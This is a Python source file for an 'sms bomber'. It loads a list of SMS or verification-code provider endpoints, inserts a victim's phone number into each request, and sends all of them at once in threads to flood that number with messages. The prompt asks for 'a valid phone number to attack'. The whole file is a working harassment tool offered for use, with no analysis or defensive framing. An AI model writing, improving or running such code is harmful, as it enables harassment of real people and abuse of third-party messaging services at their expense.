import requests
import threading
import json



def replace_phonenumber(phone , data="") :
    result = data.replace("Replace phonenumber here" , phone)
    return result


def send_message(phone, provider_name, provider_info = {} ) :
    method = provider_info.get("method")
    url = provider_info.get("url")

    if (method.lower() == "post"):
        parameters = provider_info.get("parameters")

        try :
            response = requests.post(url=url , json=parameters , timeout=2)
            if response.status_code == 200 :
                print(f"{provider_name} => Successful ;")
            else :
                print(f"{provider_name} => Failed ;")
        except Exception as error :
            print(f"{provider_name} => {error} ;")

    elif (method.lower() == "get") :
        try :
            response = requests.get(url=url , timeout=2)
            if response.status_code == 200 :
                print(f"{provider_name} => Successful ;")
            else :
                print(f"{provider_name} => Failed ;")
        except Exception as error :
            print(f"{provider_name} => {error} ;")

    else :
        print(f"Unknown Method")


def start_attack (phone):

    file = open("providers.json")
    data = file.read()

    Final_data = replace_phonenumber(phone=phone , data=data)
    providers = json.loads(Final_data)

    thread_list = []

    for provider in providers :
        provider_info = providers.get(provider)
        thread = threading.Thread(target=send_message , args=(phone , provider, provider_info))
        thread_list.append(thread)
    
    # start thread 
    for thread in thread_list : 
        thread.start()

    # wait until thread finish
    for thread in thread_list :
        thread.join()


def main() :
    print("Wellcome to sms bomber (https://github.com/Hamed-244/sms-bomber) give us a star")
    phone = input("Enter a valid phone number to attack : ").strip()

    if phone in ["" , " " , "0"] :
        print("invalid phone number !")
    else :
        start_attack(phone)
        print("Attack finished :)")


if __name__ == "__main__":
    main()
